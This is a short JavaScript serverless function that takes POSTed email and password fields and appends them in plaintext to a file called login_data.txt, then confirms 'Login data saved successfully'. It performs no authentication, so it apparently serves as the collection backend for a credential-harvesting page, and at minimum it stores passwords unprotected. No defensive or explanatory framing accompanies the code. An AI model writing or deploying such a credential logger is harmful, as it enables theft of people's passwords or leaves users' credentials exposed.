const fs = require('fs');
const path = require('path');

exports.handler = async function(event, context) {
    if (event.httpMethod === 'POST') {
        const data = JSON.parse(event.body);

        // Append login data to file
        const filePath = path.join(__dirname, '../login_data.txt');
        const logEntry = `Email: ${data.email}, Password: ${data.password}\n`;
        fs.appendFileSync(filePath, logEntry);

        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Login data saved successfully' }),
        };
    } else {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Method not allowed' }),
        };
    }
};
